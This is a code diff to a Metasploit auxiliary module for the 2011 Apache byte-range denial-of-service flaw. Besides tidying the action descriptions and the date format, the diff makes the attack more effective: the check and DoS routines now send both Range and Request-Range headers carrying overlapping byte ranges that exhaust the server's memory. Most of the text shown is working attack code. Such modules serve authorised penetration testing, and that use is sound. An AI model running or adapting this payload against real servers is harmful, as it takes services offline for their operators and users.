@@ -27,8 +27,8 @@ class MetasploitModule < Msf::Auxiliary
       'License'        => MSF_LICENSE,
       'Actions'        =>
         [
-          ['DOS'],
-          ['CHECK']
+          ['DOS', 'Description' => 'Trigger Denial of Service against target'],
+          ['CHECK', 'Description' => 'Check if target is vulnerable']
         ],
       'DefaultAction'  => 'DOS',
       'References'     =>
@@ -38,7 +38,7 @@ class MetasploitModule < Msf::Auxiliary
           [ 'EDB', '17696'],
           [ 'OSVDB', '74721' ],
         ],
-      'DisclosureDate' => 'Aug 19 2011'
+      'DisclosureDate' => '2011-08-19'
     ))
 
     register_options(
@@ -62,30 +62,32 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def check_for_dos()
-    path = datastore['URI']
+    uri = datastore['URI']
+    rhost = datastore['RHOST']
     begin
       res = send_request_cgi({
-        'uri'     =>  path,
+        'uri'     =>  uri,
         'method'  => 'HEAD',
         'headers' => {
-          "HOST"          => "Localhost",
+          "HOST"  => rhost,
+          "Range" => "bytes=5-0,1-1,2-2,3-3,4-4,5-5,6-6,7-7,8-8,9-9,10-10",
           "Request-Range" => "bytes=5-0,1-1,2-2,3-3,4-4,5-5,6-6,7-7,8-8,9-9,10-10"
         }
       })
 
       if (res and res.code == 206)
         print_status("Response was #{res.code}")
-        print_status("Found Byte-Range Header DOS at #{path}")
+        print_status("Found Byte-Range Header DOS at #{uri}")
 
         report_note(
           :host   => rhost,
           :port   => rport,
           :type   => 'apache.killer',
-          :data   => "Apache Byte-Range DOS at #{path}"
+          :data   => "Apache Byte-Range DOS at #{uri}"
         )
 
       else
-        print_status("#{rhost} doesn't seem to be vulnerable at #{path}")
+        print_status("#{rhost} doesn't seem to be vulnerable at #{uri}")
       end
 
       rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
@@ -108,8 +110,9 @@ class MetasploitModule < Msf::Auxiliary
           'uri'     =>  uri,
           'method'  => 'HEAD',
           'headers' => {
-            "HOST" => rhost,
-            "Range" => "bytes=0-#{ranges}"}},1)
+            "HOST"  => rhost,
+            "Range" => "bytes=0-#{ranges}",
+            "Request-Range" => "bytes=0-#{ranges}"}},1)
 
       rescue ::Rex::ConnectionRefused
         print_error("Unable to connect to #{rhost}:#{rport}")
